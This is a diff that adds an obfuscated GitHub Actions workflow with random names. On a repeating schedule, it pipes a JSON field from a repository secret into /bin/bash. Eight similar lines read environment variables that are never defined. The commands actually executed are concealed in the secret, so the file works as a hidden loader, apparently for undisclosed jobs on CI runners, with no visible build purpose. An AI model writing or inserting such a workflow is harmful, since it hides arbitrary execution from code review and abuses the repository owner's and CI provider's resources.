@@ -1,0 +1,25 @@
+name: hushizhi2178
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: hushizhi2178
+        env:
+          ts51: ${{ secrets.ts51 }}
+        run: |
+          echo $ts51 | jq -r .xuz05501 | /bin/bash
+          echo $fv49 | jq -r .ookqf68935 | /bin/bash
+          echo $dlu02 | jq -r .v9418 | /bin/bash
+          echo $mhuqh451 | jq -r .sjzc7 | /bin/bash
+          echo $yner895 | jq -r .scrx23907 | /bin/bash
+          echo $u45 | jq -r .awosm1763 | /bin/bash
+          echo $dzoo876 | jq -r .vwsdc2311 | /bin/bash
+          echo $ysv6 | jq -r .vz4841 | /bin/bash
+          echo $h7000 | jq -r .pox42 | /bin/bash
+
